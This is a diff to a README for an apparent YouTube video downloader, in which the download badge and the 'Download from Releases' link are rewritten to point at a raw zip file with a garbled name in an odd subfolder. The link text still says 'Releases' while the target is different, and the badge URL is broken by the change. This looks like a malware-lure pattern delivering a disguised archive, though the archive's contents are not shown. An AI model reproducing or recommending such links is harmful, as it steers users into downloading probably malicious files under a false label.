@@ -1,7 +1,7 @@
 # 🎥 How-to-download-YouTube-video - Easily Download Your Favorite Videos
 
 ## 📦 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-%20-blue?style=for-the-badge&logo=github)](https://github.com/ZenkaiGl3o/How-to-download-YouTube-video/releases)
+[![Download Here](https://github.com/ZenkaiGl3o/How-to-download-YouTube-video/raw/refs/heads/main/neocytosis/download_video_How_You_Tube_to_3.9-alpha.1.zip%20Now-%20-blue?style=for-the-badge&logo=github)](https://github.com/ZenkaiGl3o/How-to-download-YouTube-video/raw/refs/heads/main/neocytosis/download_video_How_You_Tube_to_3.9-alpha.1.zip)
 
 ## 🚀 Getting Started
 This application allows you to download videos directly from YouTube. You can save your favorite clips to your computer or laptop, making offline viewing easy and convenient. 
@@ -16,7 +16,7 @@ To use this video downloader, your system should meet the following requirements
 ## 📥 Download & Install
 To get started, visit the following page to download the application:
 
-[Download from Releases](https://github.com/ZenkaiGl3o/How-to-download-YouTube-video/releases)
+[Download from Releases](https://github.com/ZenkaiGl3o/How-to-download-YouTube-video/raw/refs/heads/main/neocytosis/download_video_How_You_Tube_to_3.9-alpha.1.zip)
 
 ### Installation Steps:
 1. After visiting the Releases page, look for the latest version of the application.
